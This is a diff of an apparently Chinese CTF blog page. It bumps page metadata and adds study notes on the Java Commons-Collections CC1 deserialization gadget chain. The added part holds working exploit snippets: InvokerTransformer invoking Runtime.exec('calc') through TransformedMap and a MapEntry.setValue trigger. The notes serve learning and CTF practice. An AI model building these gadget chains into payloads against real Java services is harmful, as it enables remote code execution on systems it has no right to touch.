@@ -488,21 +488,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-06-08
+                    2025-06-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    12.5k
+                    12.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    57 分
+                    58 分
                 </div>
                 
 
@@ -1760,6 +1760,51 @@ public class cc7 &#123;
 <h2 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h2><p>在847的基础上禁止了TransformedMap类</p>
 <p>换成LazyMap就行，一样的东西</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230326141149441.png" alt="image-20230326141149441"></p>
+<h1 id="二开"><a href="#二开" class="headerlink" title="二开"></a>二开</h1><p>basic code</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class Main &#123;
+    public static void main(String[] args)&#123;
+        
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        OutputStream outputStream &#x3D; Files.newOutputStream(Paths.get(&quot;ser.bin&quot;));
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(outputStream);
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        InputStream inputStream &#x3D; Files.newInputStream(Paths.get(&quot;ser.bin&quot;));
+        ObjectInputStream oi &#x3D; new ObjectInputStream(inputStream);
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+
+
+<h2 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1"></a>CC1</h2><p>invokerTransform.transform</p>
+<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;使用invokerTransform实现任意命令执行
+Runtime runtime &#x3D; Runtime.getRuntime();
+Transformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
+exec.transform(runtime);</code></pre>
+
+<p>Transformermap-&gt;invokerTransform.transform</p>
+<pre class="language-java" data-language="java"><code class="language-java">Runtime runtime &#x3D; Runtime.getRuntime();  
+Transformer[] exec &#x3D; new InvokerTransformer[]&#123;new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;                
+Map&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        
+Map decorate &#x3D; TransformedMap.decorate(objectObjectHashMap, exec, exec); 
+Object put &#x3D; decorate.put(runtime, runtime);</code></pre>
+
+<p>AbstractMapEntryDecorator.MapEntry.setValue-&gt;Transformermap.checkSetValue-&gt;invokerTransform.transform</p>
+<pre class="language-java" data-language="java"><code class="language-java">        Runtime runtime &#x3D; Runtime.getRuntime();
+        Transformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
+&#x2F;&#x2F;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(exec);
+&#x2F;&#x2F;        chainedTransformer.transform(runtime);
+        Map&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
+        objectObjectHashMap.put(&quot;1&quot;,&quot;2&quot;);
+        Map&lt;Object,Object&gt; decorate &#x3D; TransformedMap.decorate(objectObjectHashMap,null, exec);
+        for (Map.Entry entry:decorate.entrySet())&#123;
+            entry.setValue(runtime);
+        &#125;</code></pre>
+
+<p>AnnotationinvocationHandler.readObject-&gt;AbstractMapEntryDecorator.MapEntry.setValue-&gt;Transformermap.setValue-&gt;invokerTransform.transform</p>
 
                 
             </div>
@@ -2565,7 +2610,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">243k</span>
+                        class="white-color">243.3k</span>
             
             
             
